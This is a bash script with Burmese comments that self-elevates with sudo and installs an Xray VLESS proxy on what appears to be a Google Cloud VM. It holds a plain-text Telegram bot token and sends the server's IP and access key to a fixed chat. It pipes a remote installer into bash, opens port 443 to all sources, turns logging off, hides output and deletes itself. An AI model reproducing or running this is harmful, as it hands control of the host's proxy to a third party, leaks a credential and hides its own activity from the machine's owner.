#!/bin/bash

# ၁။ Root Access ယူခြင်း
if [[ $EUID -ne 0 ]]; then
   exec sudo bash "$0" "$@"
   exit 1
fi

# --- Configuration ---
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
UUID=$(cat /proc/sys/kernel/random/uuid)
PORT=443
SNI="m.googleapis.com"
PATH_NAME="/sos-vless"
IP=$(curl -s ifconfig.me)

# ၂။ VLESS Link ကို ကြိုတင်ထုတ်ခြင်း
VLESS_KEY="vless://$UUID@$IP:$PORT?type=ws&security=none&path=%2Fsos-vless&host=$SNI&sni=$SNI#$DEV_NAME-ULTRA"

# ၃။ Telegram ဆီ အရင်ဆုံး စာပို့ခြင်း (စာအရင်ရောက်အောင်)
clear
echo -e "\e[1;33m[*] Sending Key to Telegram...\e[0m"

MESSAGE="🚀 <b>S 0 S NODE DEPLOYED</b>%0A%0A🌐 IP: <code>$IP</code>%0A✨ <b>VLESS KEY:</b>%0A<code>$VLESS_KEY</code>"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=$MESSAGE" \
     -d "parse_mode=HTML" > /dev/null

# ၄။ System Optimization & Xray Installation
echo -e "\e[1;32m[*] Telegram Sent! Now installing Server Components...\e[0m"
apt-get update -y && apt-get install -y unzip curl sudo > /dev/null 2>&1

# Xray Install
bash <(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh) > /dev/null 2>&1

# ၅။ Config File ဆောက်ခြင်း
mkdir -p /usr/local/etc/xray
cat <<EOF > /usr/local/etc/xray/config.json
{
  "log": { "loglevel": "none" },
  "inbounds": [{
    "port": $PORT,
    "protocol": "vless",
    "settings": {
      "clients": [{ "id": "$UUID" }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "ws",
      "wsSettings": { "path": "$PATH_NAME" }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ၆။ Firewall & Service Start
systemctl daemon-reload
systemctl restart xray
systemctl enable xray
gcloud compute firewall-rules create allow-vless-$(date +%s) --allow tcp:$PORT --priority 1000 --direction INGRESS --action ALLOW --source-ranges 0.0.0.0/0 > /dev/null 2>&1

echo -e "\e[1;32m-----------------------------------------\e[0m"
echo -e "✅ အားလုံးပြီးပါပြီ။ Telegram မှာ Key ကိုယူလိုက်ပါ။"
echo -e "\e[1;32m-----------------------------------------\e[0m"

rm -- "$0"
